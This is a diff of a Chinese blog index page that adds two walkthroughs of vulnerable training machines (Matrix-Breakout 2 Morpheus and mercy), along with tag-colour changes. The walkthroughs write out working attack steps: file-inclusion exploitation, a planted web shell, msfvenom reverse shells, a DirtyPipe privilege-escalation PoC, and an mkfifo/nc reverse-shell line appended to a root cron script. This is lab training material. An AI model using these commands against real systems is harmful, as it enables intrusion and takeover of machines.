@@ -200,6 +200,133 @@
         
 
 <div class="post">
+    <a href="/2025/04/02/Matrix-Breakout-2-Morpheus-%E5%AE%9E%E6%88%98/">
+        <h2 class="post-title">Matrix-Breakout: 2 Morpheus 实战</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E7%AC%94%E8%AE%B0/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                笔记
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/4/2
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>惯例先nmap扫主机ip和端口</p>
+<pre><code class="bash">nmap 192.168.23.0/24
+</code></pre>
+<p><img src="image-20250402172749385.png" alt="image-20250402172749385"></p>
+<p>三个端口开放， ip是192.168.23.163</p>
+<p>22是ssh先不看。80是http，看一下</p>
+<p><img src="image-20250402172830973.png" alt="image-20250402172830973"></p>
+<p>没什么信息。看看81端口</p>
+<p><img src="image-20250402172856687.png" alt="image-20250402172856687"></p>
+<p>81端口要登录，不知道用户名密码，放弃，还看80端口。</p>
+<p>扫一下目录</p>
+<pre><code class="bash">dirb http://192.168.23.163/ -X .txt,.php
+</code></pre>
+<p><img src="image-20250402173035179.png" alt="image-20250402173035179"></p>
+<p>只有一个robots.txt，看看</p>
+<p><img src="image-20250402173102249.png" alt="image-20250402173102249"></p>
+<p>没什么有用的信息。</p>
+<p>换一个目录扫描工具，找个更大的字典再扫一遍</p>
+<pre><code class="bash">gobuster dir -u http://192.168.23.163/ -x .txt,.php -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+</code></pre>
+<p><img src="image-20250402173231489.png" alt="image-20250402173231489"></p>
+<p>找到了graffiti.php和graffiti.txt，访问graffiti.php看看是什么</p>
+<p><img src="image-20250402173316677.png" alt="image-20250402173316677"></p>
+<p>一个简单的输入信息发布挂上去的脚本。试了试没有XSS，换个思路，看一下html源码。</p>
+<p><img src="image-20250402173354759.png" alt="image-20250402173354759"></p>
+<p>input标签提示有一个file参数，值为graffiti.txt，请求方式为POST，用burp抓个包看看</p>
+<p><img src="image-20250402173441590.png" alt="image-20250402173441590"></p>
+<p>有的，猜测这里是个文件包含漏洞。用php伪协议看看graffiti.php源码能不能获取到。</p>
+<p><img src="image-20250402173638844.png" alt="image-20250402173638844"></p>
+<p>获取到了源码</p>
+<p><img src="image-20250402173704928.png" alt="image-20250402173704928"></p>
+<p>那就好办了。写个一句话，挂到一个新的php上去</p>
+<p><img src="image-20250402173817949.png" alt="image-20250402173817949"></p>
+<p>然后send，用蚁剑连一下。</p>
+<p><img src="image-20250402173908643.png" alt="image-20250402173908643"></p>
+<p>msfvenom写个反弹shell</p>
+<pre><code class="bash">msfvenom -p php/meterpreter/reverse_tcp
+</code></pre>
+<p>一般默认即可，ip就是你的攻击机ip，端口默认4444。把生成的反弹shell挂到backdoor.php上去</p>
+<p><img src="image-20250402174105719.png" alt="image-20250402174105719"></p>
+<p>msfconsole准备监听</p>
+<pre><code class="bash">msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 192.168.23.159
+set LPORT 4444
+run
+</code></pre>
+<p>访问靶机上挂了反弹shell的php，也就是<a target="_blank" rel="noopener" href="http://192.168.23.163/backdoor.php">http://192.168.23.163/backdoor.php</a></p>
+<p><img src="image-20250402174312159.png" alt="image-20250402174312159"></p>
+<p>监听成功，写个交互，然后看一下内核版本</p>
+<pre><code class="bash">ls /boot
+</code></pre>
+<p><img src="image-20250402174405468.png" alt="image-20250402174405468"></p>
+<p>linux 5.10内核，找个PoC跑一下</p>
+<pre><code class="bash">searchsploit linux 5.10
+# Linux Kernel 5.8 &lt; 5.16.11 - Local Privilege Escalation (DirtyPipe)                   | linux/local/50808.c
+searchsploit -m linux/local/50808.c
+gcc 50808.c -o 50808 -static
+</code></pre>
+<p>编译好后在蚁剑那边传上去</p>
+<p>然后赋一个可执行权限</p>
+<pre><code class="bash">chmod +x 50808
+</code></pre>
+<p>PoC需要一个具有 SUID 权限的文件才能提取。找一下有没有</p>
+<pre><code class="bash">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p><img src="image-20250402174738541.png" alt="image-20250402174738541"></p>
+<p>有的兄弟，有的</p>
+<p>那就随便找一个作为参数</p>
+<pre><code class="bash">./50808 /usr/bin/su
+</code></pre>
+<p><img src="image-20250402174820598.png" alt="image-20250402174820598"></p>
+<p>成功提权</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/Writeup/" style="color: #00a596">Writeup</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #00bcd4">网安</a>
+        </span>
+        
+    </div>
+    <a href="/2025/04/02/Matrix-Breakout-2-Morpheus-%E5%AE%9E%E6%88%98/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2025/03/31/mercy%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/">
         <h2 class="post-title">mercy靶机实战</h2>
     </a>
@@ -226,7 +353,87 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><em>这里假设已知攻击机ip。</em></p>
+            <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p> 首先进行网络发现，扫描192.168.23.0网段下所有存活主机并获取开放端口。</p>
+<p><img src="image-20250331160817182.png" alt="image-20250331160817182"></p>
+<p>靶机ip为192.168.23.158，开放了一系列端口。奇怪的是，常用的22和80端口被防火墙阻挡了，无法访问。猜测可能有敲门机制什么的。注意到有个8080端口开放访问，这是http代理端口，先从这里看起。另外，还注意到有445端口，这是samba服务，同样作为一个可能的攻击方向。</p>
+<p><img src="image-20250331161237919.png" alt="image-20250331161237919"></p>
+<p>8080端口提示服务器安装了tomcat服务，但是没有获取到什么信息，只知道有两个webapp，但是需要用户名密码验证。现在暂时有点束手无策，那么就dirb爆破一下目录，看看有没有什么新的东西。</p>
+<p>找到了一个robots.txt，访问发现禁止爬虫访问&#x2F;tryharder&#x2F;tryharder。我们访问一下。</p>
+<p><img src="image-20250331161619119.png" alt="image-20250331161619119"></p>
+<p>一串base64。解码一下，指令：</p>
+<pre><code class="bash">echo &quot;base64&quot; | base64 -d
+</code></pre>
+<p>提示有一个用户的密码是password，需要获取用户名。联想到前面还有samba服务，我们对samba服务进行一下枚举。</p>
+<pre><code class="bash">enum4linux -a 192.168.23.158
+</code></pre>
+<p><img src="image-20250331161842760.png" alt="image-20250331161842760"></p>
+<p>告诉我们靶机有4个用户。看一下文件共享情况。</p>
+<pre><code class="bash">smbclient \\\\192.168.23.158\\qiu -U qiu
+</code></pre>
+<p>需要登录，用password作为密码，成功登录。</p>
+<p><img src="image-20250331162206906.png" alt="image-20250331162206906"></p>
+<p>看一下当前目录信息，注意到.private文件夹，继续探索。</p>
+<p><img src="image-20250331162239981.png" alt="image-20250331162239981"></p>
+<p>有这些文件和目录。继续探索</p>
+<p>opensesame里有config文件，get下来</p>
+<p><code>get config</code></p>
+<p>然后查看，是敲门口令，给了一个敲门顺序。</p>
+<p>那就敲一下。</p>
+<pre><code class="bash">knock 192.168.23.158 159 27391 4 -v
+</code></pre>
+<p>然后再nmap一下，80端口就开放了。</p>
+<p>访问192.168.23.158，没什么有用的信息。</p>
+<p>继续目录爆破</p>
+<p>有一个robots.txt，访问。</p>
+<p>禁止爬虫访问了两个路径：&#x2F;mercy和&#x2F;nomercy。逐个访问</p>
+<p>&#x2F;mercy目录没有什么有用的信息，看看nomercy。</p>
+<p>是一个rips服务，版本号为0.53。看一下有没有可利用的漏洞。</p>
+<pre><code class="bash">searchsploit rips 0.53
+</code></pre>
+<p>了解到有一个文件包含漏洞，来看一下如何实现。</p>
+<pre><code class="bash">searchsploit -m php/webapps/18660.txt
+</code></pre>
+<p>了解到我们需要访问&#x2F;rips&#x2F;windows&#x2F;code.php，有一个file参数可以复现该漏洞。</p>
+<p>加到url上。因为rips被改为了nomercy，同样地把PoC中的rips改为nomercy</p>
+<p><img src="image-20250331164138865.png" alt="image-20250331164138865"></p>
+<p>复现成功。</p>
+<p>前面tomcat的It works页面提示用户配置文件在&#x2F;etc&#x2F;tomcat7&#x2F;tomcat-users.xml中。我们利用这个漏洞访问一下。</p>
+<p><img src="image-20250331164324840.png" alt="image-20250331164324840"></p>
+<p>找到了两个用户：thisisasuperduperlonguser和fluffy，同时知道了这两个用户的密码。</p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>回到8080端口，然后以thisisasuperduperlonguser的身份登录manager服务。</p>
+<p>找到了个文件上传点，用msfvenom做一个反弹shell挂上去。</p>
+<pre><code class="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.23.159 LPORT=8888 -f war -o  8888.war
+</code></pre>
+<p>然后看一下要访问的jsp</p>
+<pre><code class="bash">7z l 8888.war
+</code></pre>
+<p><img src="image-20250331164920885.png" alt="image-20250331164920885"></p>
+<p>然后上传并部署。</p>
+<p><img src="image-20250331164957215.png" alt="image-20250331164957215"></p>
+<p>部署好了，准备nc监听。</p>
+<pre><code class="bash">nc -lvnp 8888
+</code></pre>
+<p>然后访问jsp，成功反弹，写个交互</p>
+<pre><code class="bash">python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p>拿到shell，看看有没有sudo权限。</p>
+<p><code>sudo -l</code>要求输入密码，不知道，放弃。</p>
+<p>联想到前面还有一个fluffy用户，切换到那个用户上看看。</p>
+<p><code>su fluffy</code></p>
+<p>密码是freakishfluffybunny，这是 在前面文件包含那里获取到的fluffy用户的密码。</p>
+<p>登录成功，再尝试sudo -l</p>
+<p>输入密码，发现用户sudo被禁用了。</p>
+<p>那就回家目录，看看有无什么有用信息。</p>
+<p>找到家目录下有个隐藏文件夹.private，里面有个定时服务，权限为777，而且执行权限是root。我们可以在这里挂个反弹shell来获取root权限。</p>
+<pre><code class="bash">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 192.168.23.159 8888 &gt;/tmp/f&quot; &gt;&gt; timeclock
+</code></pre>
+<p>另一边，挂个监听</p>
+<pre><code class="bash">nc -lvnp 8888
+</code></pre>
+<p>需要稍微等一小会才能监听到。</p>
+<p><img src="image-20250331170949448.png" alt="image-20250331170949448"></p>
+<p>成功提权。</p>
+
             
         </div>
     </div>
@@ -240,12 +447,12 @@
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #ff7d73">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #00bcd4">Writeup</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #00bcd4">网安</a>
+            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #ff7d73">网安</a>
         </span>
         
     </div>
@@ -293,7 +500,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00bcd4">笔记</a>
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00a596">笔记</a>
         </span>
         
     </div>
@@ -346,7 +553,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #ffa2c4">网安</a>
+            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #03a9f4">网安</a>
         </span>
         
     </div>
@@ -396,7 +603,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00a596">笔记</a>
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #03a9f4">笔记</a>
         </span>
         
     </div>
@@ -445,7 +652,7 @@
         
         <span class="tag">
             
-            <a href="/tags/AI/" style="color: #ffa2c4">AI</a>
+            <a href="/tags/AI/" style="color: #03a9f4">AI</a>
         </span>
         
         <span class="tag">
@@ -498,7 +705,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%9D%82%E9%A1%B9/" style="color: #ffa2c4">杂项</a>
+            <a href="/tags/%E6%9D%82%E9%A1%B9/" style="color: #00a596">杂项</a>
         </span>
         
     </div>
@@ -645,59 +852,11 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #ff7d73">小说</a>
-        </span>
-        
-    </div>
-    <a href="/2024/12/25/%E5%BC%94%E6%96%87%E2%80%94%E2%80%94%E7%BD%91%E7%95%8C%E8%B6%85%E4%BA%BA/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/12/25/%E5%BC%94%E6%96%87%E2%80%94%E2%80%94%E5%B9%B3%E5%B9%B3%E6%97%A0%E5%A5%87/">
-        <h2 class="post-title">弔文——平平无奇</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/%E5%B0%8F%E8%AF%B4/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                小说
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/12/25
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="平平无奇"><a href="#平平无奇" class="headerlink" title="平平无奇"></a>平平无奇</h1><p>Written by NAC Studio Team<br><em>作者の话：这是个虚构的故事，而我想要通过这些虚构的故事来反应一些校园班级内很真实的事情、有趣的事情，或议论它们，或表达出我对一些普遍事情的感受。这是本人第一次写小说，还望多多指教。小说中所有人物皆为虚构。</em></p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
             <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #03a9f4">小说</a>
         </span>
         
     </div>
-    <a href="/2024/12/25/%E5%BC%94%E6%96%87%E2%80%94%E2%80%94%E5%B9%B3%E5%B9%B3%E6%97%A0%E5%A5%87/" class="go-post">阅读全文</a>
+    <a href="/2024/12/25/%E5%BC%94%E6%96%87%E2%80%94%E2%80%94%E7%BD%91%E7%95%8C%E8%B6%85%E4%BA%BA/" class="go-post">阅读全文</a>
 </div>
 
 
